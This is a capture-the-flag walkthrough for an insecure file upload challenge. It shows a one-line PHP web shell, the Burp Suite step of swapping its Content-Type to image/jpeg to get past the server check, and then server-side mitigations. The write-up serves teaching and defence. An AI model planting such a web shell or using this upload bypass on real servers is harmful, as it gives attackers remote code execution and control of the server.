# A4 - Insecure File Upload

OWASP Top 10 (2017) vulnerability. The file upload section restricts uploads to images by validating the `Content-Type` of the HTTP request and with client-side JavaScript, but does not verify the actual file content on the server.

---

## Steps to Obtain the Flag

### 1. Identify the Vector

The server rejects files with non-image `Content-Type`, but blindly trusts this header without inspecting the actual file content.

### 2. Prepare the Malicious File

Create a PHP file (e.g., `shell.php`) with any content:
```php
<?php system($_GET['cmd']); ?>
```

### 3. Intercept and Manipulate with Burp Suite

1. Enable the interceptor in Burp Suite.
2. Select the file and submit from the form.
3. In the intercepted request, locate the file header:
   ```
   Content-Disposition: form-data; name="file"; filename="shell.php"
   Content-Type: application/x-php
   ```
4. Change the `Content-Type` to:
   ```
   Content-Type: image/jpeg
   ```
5. Resend the request → the server accepts the file and returns the **flag**.

### 4. Why It Works

The server validates only the `Content-Type` header, which is completely client-controlled. It performs no inspection of actual file content (magic bytes) or uses image validation libraries.

---

## Impact

- **RCE (Remote Code Execution):** upload and execute malicious scripts on the server.
- **Server Takeover:** obtain a remote shell.
- **Defacement:** replace site content.
- **Malware Distribution:** host payloads on a trusted server.

---

## Mitigation

1. **Validate Actual File Content (Magic Bytes)** on server, never trust client `Content-Type`:
   ```php
   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
   $allowed = ['image/jpeg', 'image/png', 'image/gif'];
   if (!in_array($mime, $allowed)) die('Type not allowed');
   ```
2. **Verify It's a Real Image:**
   ```php
   if (!getimagesize($_FILES['file']['tmp_name'])) die('Not a valid image');
   ```
3. **Rename the File** on server to prevent execution by predictable name.
4. **Store Uploads Outside the Webroot** or in a bucket with no execution.
5. **Never Trust Client-side Validation** (JavaScript or HTTP headers).
